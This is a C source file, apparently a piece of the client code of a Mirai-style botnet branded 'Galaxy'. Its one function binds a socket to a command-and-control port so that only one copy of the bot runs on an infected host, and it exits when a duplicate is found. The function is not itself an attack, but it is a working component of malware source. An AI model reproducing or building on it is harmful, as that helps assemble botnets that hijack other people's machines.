#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "headers/tcp.h"
#include "headers/includes.h"

uint32_t LOCAL_ADDR2;

void ensure(void)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);

    if (fd == -1)
    {
        #ifdef DEBUG
        printf("(Galaxy) >> socket failed\n");
        #endif
        return;
    }

    if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) == -1)
    {
        #ifdef DEBUG
        printf("(Galaxy) >> setsockopt failed\n");
        #endif
        close(fd);
        return;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(CNC_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        #ifdef DEBUG
        printf("(Galaxy) >> dupe detected\n");
        #endif
        exit(1);
    }

    if (listen(fd, 1) == -1)
    {
        #ifdef DEBUG
        printf("(Galaxy) >> listen failed\n");
        #endif
        close(fd);
        return;
    }
    #ifdef DEBUG
    printf("(Galaxy) >> No duplicated\n");
    #endif
}
